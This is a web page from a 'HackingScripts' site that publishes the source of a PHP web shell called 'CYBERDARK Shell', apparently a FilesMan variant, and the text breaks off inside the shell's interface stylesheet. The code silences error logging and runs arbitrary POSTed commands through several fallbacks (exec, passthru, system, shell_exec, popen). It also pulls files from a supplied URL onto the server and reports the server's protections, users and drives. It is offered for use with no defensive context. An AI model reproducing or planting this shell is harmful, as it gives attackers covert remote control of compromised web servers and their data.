<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> CYBERDARK Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>CYBERDARK Shell</h2>
<p class="meta">11 Feb 2014</p>

<p>..Another FilesMan shell script?</p>

<h3>CYBERDARK Shell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?php</span>
<span class="lineno">   2</span> 
<span class="lineno">   3</span> <span class="sd">/**</span>
<span class="lineno">   4</span> <span class="sd"> * @author CYBERDARK</span>
<span class="lineno">   5</span> <span class="sd"> * @copyright 2012</span>
<span class="lineno">   6</span> <span class="sd"> */</span>
<span class="lineno">   7</span> <span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;VERSION&#39;</span><span class="p">,</span><span class="s1">&#39;1.0&#39;</span><span class="p">);</span>
<span class="lineno">   8</span> <span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">^</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
<span class="lineno">   9</span> <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">  10</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">);</span>
<span class="lineno">  11</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  12</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  13</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  14</span> <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">  15</span> 
<span class="lineno">  16</span> <span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">  17</span>    <span class="k">function</span> <span class="nf">madstripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  18</span>        <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;madstripslashes&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
<span class="lineno">  19</span>    <span class="p">}</span>
<span class="lineno">  20</span>    <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">madstripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="lineno">  21</span> <span class="p">}</span>
<span class="lineno">  22</span> <span class="nv">$default_action</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span>
<span class="lineno">  23</span> <span class="nv">$default_use_ajax</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">  24</span> <span class="nv">$default_charset</span> <span class="o">=</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">;</span>
<span class="lineno">  25</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">)</span>
<span class="lineno">  26</span>     <span class="nv">$sys</span><span class="o">=</span><span class="s1">&#39;win&#39;</span><span class="p">;</span>
<span class="lineno">  27</span>  <span class="k">else</span>
<span class="lineno">  28</span>     <span class="nv">$sys</span><span class="o">=</span><span class="s1">&#39;unix&#39;</span><span class="p">;</span>
<span class="lineno">  29</span>     
<span class="lineno">  30</span> <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="lineno">  31</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span>
<span class="lineno">  32</span>    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>   
<span class="lineno">  33</span>     
<span class="lineno">  34</span> <span class="nv">$cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="lineno">  35</span> <span class="k">if</span><span class="p">(</span><span class="nv">$sys</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> 
<span class="lineno">  36</span> <span class="p">{</span>
<span class="lineno">  37</span>     <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$home_cwd</span><span class="p">);</span>
<span class="lineno">  38</span>    <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">);</span>
<span class="lineno">  39</span> <span class="p">}</span>
<span class="lineno">  40</span> 
<span class="lineno">  41</span> <span class="k">if</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">[</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span>
<span class="lineno">  42</span>    <span class="nv">$cwd</span> <span class="o">.=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno">  43</span>     
<span class="lineno">  44</span>     
<span class="lineno">  45</span> <span class="k">function</span> <span class="nf">madEx</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  46</span>    <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno">  47</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">  48</span>        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span>
<span class="lineno">  49</span>        <span class="nv">$out</span> <span class="o">=</span> <span class="o">@</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span>
<span class="lineno">  50</span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">  51</span>        <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno">  52</span>        <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
<span class="lineno">  53</span>        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno">  54</span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">  55</span>        <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno">  56</span>        <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
<span class="lineno">  57</span>        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno">  58</span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">  59</span>        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
<span class="lineno">  60</span>    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span>
<span class="lineno">  61</span>        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">  62</span>        <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
<span class="lineno">  63</span>            <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span>
<span class="lineno">  64</span>        <span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">  65</span>    <span class="p">}</span>
<span class="lineno">  66</span>    <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="lineno">  67</span> <span class="p">}</span>
<span class="lineno">  68</span> <span class="nv">$down</span><span class="o">=@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="lineno">  69</span> <span class="k">if</span><span class="p">(</span><span class="nv">$sys</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">)</span>
<span class="lineno">  70</span> <span class="nv">$down</span><span class="o">.=</span><span class="s1">&#39;\\&#39;</span><span class="p">;</span>
<span class="lineno">  71</span> <span class="k">else</span>
<span class="lineno">  72</span> <span class="nv">$down</span><span class="o">.=</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno">  73</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rtdown&#39;</span><span class="p">]))</span>
<span class="lineno">  74</span> <span class="p">{</span>
<span class="lineno">  75</span> <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rtdown&#39;</span><span class="p">];</span>
<span class="lineno">  76</span> <span class="nv">$newfname</span> <span class="o">=</span> <span class="nv">$down</span><span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
<span class="lineno">  77</span> <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span> <span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">);</span>
<span class="lineno">  78</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  79</span>   <span class="nv">$newf</span> <span class="o">=</span> <span class="nb">fopen</span> <span class="p">(</span><span class="nv">$newfname</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">);</span>
<span class="lineno">  80</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$newf</span><span class="p">)</span>
<span class="lineno">  81</span>   <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">  82</span>     <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$newf</span><span class="p">,</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">8</span> <span class="p">),</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">8</span> <span class="p">);</span>
<span class="lineno">  83</span>   <span class="p">}</span>
<span class="lineno">  84</span>   <span class="p">}</span>
<span class="lineno">  85</span> 
<span class="lineno">  86</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  87</span>   <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="lineno">  88</span> <span class="p">}</span>
<span class="lineno">  89</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$newf</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">  90</span>   <span class="nb">fclose</span><span class="p">(</span><span class="nv">$newf</span><span class="p">);</span>
<span class="lineno">  91</span> <span class="p">}</span>
<span class="lineno">  92</span> <span class="p">}</span>
<span class="lineno">  93</span> 
<span class="lineno">  94</span>     
<span class="lineno">  95</span>  
<span class="lineno">  96</span>  <span class="k">function</span> <span class="nf">madhead</span><span class="p">()</span>
<span class="lineno">  97</span>  <span class="p">{</span>
<span class="lineno">  98</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]))</span>
<span class="lineno">  99</span>        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;default_charset&#39;</span><span class="p">];</span>
<span class="lineno"> 100</span>  
<span class="lineno"> 101</span> <span class="nv">$freeSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">diskfreespace</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 102</span> <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 103</span> <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="nv">$totalSpace</span><span class="o">?</span><span class="nv">$totalSpace</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>        
<span class="lineno"> 104</span>     
<span class="lineno"> 105</span> <span class="nv">$on</span><span class="o">=</span><span class="s2">&quot;&amp;lt;font color=#0F0&amp;gt; ON &amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 106</span> <span class="nv">$of</span><span class="o">=</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt; OFF &amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 107</span> <span class="nv">$none</span><span class="o">=</span><span class="s2">&quot;&amp;lt;font color=#0F0&amp;gt; NONE &amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>   
<span class="lineno"> 108</span> <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">))</span>
<span class="lineno"> 109</span>     <span class="nv">$curl</span><span class="o">=</span><span class="nv">$on</span><span class="p">;</span>
<span class="lineno"> 110</span> <span class="k">else</span>
<span class="lineno"> 111</span>     <span class="nv">$curl</span><span class="o">=</span><span class="nv">$of</span><span class="p">;</span>
<span class="lineno"> 112</span> <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span>
<span class="lineno"> 113</span>     <span class="nv">$mysql</span><span class="o">=</span><span class="nv">$on</span><span class="p">;</span>
<span class="lineno"> 114</span>  <span class="k">else</span>
<span class="lineno"> 115</span>     <span class="nv">$mysql</span><span class="o">=</span><span class="nv">$of</span><span class="p">;</span>      
<span class="lineno"> 116</span> <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span>
<span class="lineno"> 117</span>     <span class="nv">$mssql</span><span class="o">=</span><span class="nv">$on</span><span class="p">;</span>
<span class="lineno"> 118</span> <span class="k">else</span>
<span class="lineno"> 119</span>    <span class="nv">$mssql</span><span class="o">=</span><span class="nv">$of</span><span class="p">;</span> 
<span class="lineno"> 120</span>        
<span class="lineno"> 121</span> <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span>
<span class="lineno"> 122</span>     <span class="nv">$pg</span><span class="o">=</span><span class="nv">$on</span><span class="p">;</span>
<span class="lineno"> 123</span> <span class="k">else</span>
<span class="lineno"> 124</span>    <span class="nv">$pg</span><span class="o">=</span><span class="nv">$of</span><span class="p">;</span>          
<span class="lineno"> 125</span> <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span>
<span class="lineno"> 126</span>    <span class="nv">$or</span><span class="o">=</span><span class="nv">$on</span><span class="p">;</span>
<span class="lineno"> 127</span> <span class="k">else</span>
<span class="lineno"> 128</span>    <span class="nv">$or</span><span class="o">=</span><span class="nv">$of</span><span class="p">;</span>
<span class="lineno"> 129</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">))</span>
<span class="lineno"> 130</span>   <span class="nv">$disfun</span><span class="o">=@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span>
<span class="lineno"> 131</span> <span class="k">else</span>
<span class="lineno"> 132</span> <span class="nv">$disfun</span><span class="o">=</span><span class="s2">&quot;All Functions Enable&quot;</span><span class="p">;</span>
<span class="lineno"> 133</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">))</span>
<span class="lineno"> 134</span> <span class="nv">$safe_modes</span><span class="o">=</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;ON&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 135</span> <span class="k">else</span>
<span class="lineno"> 136</span> <span class="nv">$safe_modes</span><span class="o">=</span><span class="s2">&quot;&amp;lt;font color=#0F0 &amp;gt;OFF&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 137</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">))</span>
<span class="lineno"> 138</span> <span class="nv">$open_b</span><span class="o">=@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">);</span>
<span class="lineno"> 139</span>     <span class="k">else</span>
<span class="lineno"> 140</span>   <span class="nv">$open_b</span><span class="o">=</span><span class="nv">$none</span><span class="p">;</span>
<span class="lineno"> 141</span>     
<span class="lineno"> 142</span> 
<span class="lineno"> 143</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">))</span>
<span class="lineno"> 144</span> <span class="nv">$safe_exe</span><span class="o">=@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">);</span>
<span class="lineno"> 145</span>     <span class="k">else</span>
<span class="lineno"> 146</span> <span class="nv">$safe_exe</span><span class="o">=</span><span class="nv">$none</span><span class="p">;</span>
<span class="lineno"> 147</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">))</span>
<span class="lineno"> 148</span>    <span class="nv">$safe_include</span><span class="o">=@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">);</span> 
<span class="lineno"> 149</span> <span class="k">else</span>
<span class="lineno"> 150</span>  <span class="nv">$safe_include</span><span class="o">=</span><span class="nv">$none</span><span class="p">;</span>
<span class="lineno"> 151</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> 
<span class="lineno"> 152</span> <span class="p">{</span>
<span class="lineno"> 153</span>        <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span>
<span class="lineno"> 154</span>        <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span>
<span class="lineno"> 155</span>        <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span>
<span class="lineno"> 156</span>        <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
<span class="lineno"> 157</span> <span class="p">}</span> <span class="k">else</span> 
<span class="lineno"> 158</span> <span class="p">{</span>
<span class="lineno"> 159</span>        <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">posix_geteuid</span><span class="p">());</span>
<span class="lineno"> 160</span>        <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">posix_getegid</span><span class="p">());</span>
<span class="lineno"> 161</span>        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno"> 162</span>        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
<span class="lineno"> 163</span>        <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno"> 164</span>        <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span>
<span class="lineno"> 165</span>    <span class="p">}</span>
<span class="lineno"> 166</span> 
<span class="lineno"> 167</span> 
<span class="lineno"> 168</span>      <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 169</span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
<span class="lineno"> 170</span>    <span class="nv">$n</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 171</span>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 172</span>        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;a  href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 173</span>        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$i</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span>
<span class="lineno"> 174</span>            <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno"> 175</span>        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$path</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 176</span>    <span class="p">}</span>
<span class="lineno"> 177</span> 
<span class="lineno"> 178</span> <span class="nv">$drives</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 179</span> <span class="k">foreach</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$drive</span><span class="p">)</span>
<span class="lineno"> 180</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:\\&#39;</span><span class="p">))</span>
<span class="lineno"> 181</span> <span class="nv">$drives</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:/\&#39;)&quot;&amp;gt;[ &#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39; ]&amp;lt;/a&amp;gt; &#39;</span><span class="p">;</span>
<span class="lineno"> 182</span> 
<span class="lineno"> 183</span> 
<span class="lineno"> 184</span> 
<span class="lineno"> 185</span> 
<span class="lineno"> 186</span> 
<span class="lineno"> 187</span>  <span class="k">echo</span> <span class="s1">&#39;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;</span>
<span class="lineno"> 188</span> <span class="s1">&amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;</span>
<span class="lineno"> 189</span> <span class="s1">&amp;lt;head&amp;gt;</span>
<span class="lineno"> 190</span> <span class="s1">&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&amp;gt;</span>
<span class="lineno"> 191</span> <span class="s1">&amp;lt;link href=&quot;http://www.madspot.net/favicon.ico&quot; rel=&quot;icon&quot; type=&quot;image/x-icon&quot;/&amp;gt;</span>
<span class="lineno"> 192</span> <span class="s1">&amp;lt;title&amp;gt;Madspot Security Team Shell&amp;lt;/title&amp;gt;</span>
<span class="lineno"> 193</span> <span class="s1">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
<span class="lineno"> 194</span> <span class="s1">&amp;lt;!--</span>
<span class="lineno"> 195</span> <span class="s1">.whole {</span>
<span class="lineno"> 196</span> <span class="s1">  background-color: #CCC;</span>
<span class="lineno"> 197</span> <span class="s1">  height:auto;</span>
<span class="lineno"> 198</span> <span class="s1">  width: auto;</span>
<span class="lineno"> 199</span> <span class="s1">  margin-top: 10px;</span>
<span class="lineno"> 200</span> <span class="s1">  margin-right: 10px;</span>
<span class="lineno"> 201</span> <span class="s1">  margin-left: 10px;</span>
<span class="lineno"> 202</span> <span class="s1">}</span>
<span class="lineno"> 203</span> <span class="s1">.header {</span>
<span class="lineno"> 204</span> <span class="s1">  height: auto;</span>
<span class="lineno"> 205</span> <span class="s1">  width: auto;</span>
<span class="lineno"> 206</span> <span class="s1">  border: 7px solid #CCC;</span>
<span class="lineno"> 207</span> <span class="s1">  color: #999;</span>
<span class="lineno"> 208</span> <span class="s1">  font-size: 12px;</span>
<span class="lineno"> 209</span> <span class="s1">  font-family: Verdana, Geneva, sans-serif;</span>
<span class="lineno"> 210</span> <span class="s1">  background-color: #000;</span>
<span class="lineno"> 211</span> <span class="s1">}</span>
<span class="lineno"> 212</span> <span class="s1">.header a {color:#0F0; text-decoration:none;}</span>
<span class="lineno"> 213</span> <span class="s1">span {</span>
<span class="lineno"> 214</span> <span class="s1">  font-weight: bolder;</span>
<span class="lineno"> 215</span> <span class="s1">  color: #FFF;</span>
<span class="lineno"> 216</span> <span class="s1">}</span>
<span class="lineno"> 217</span> <span class="s1">#meunlist {</span>
<span class="lineno"> 218</span> <span class="s1">  font-family: Verdana, Geneva, sans-serif;</span>
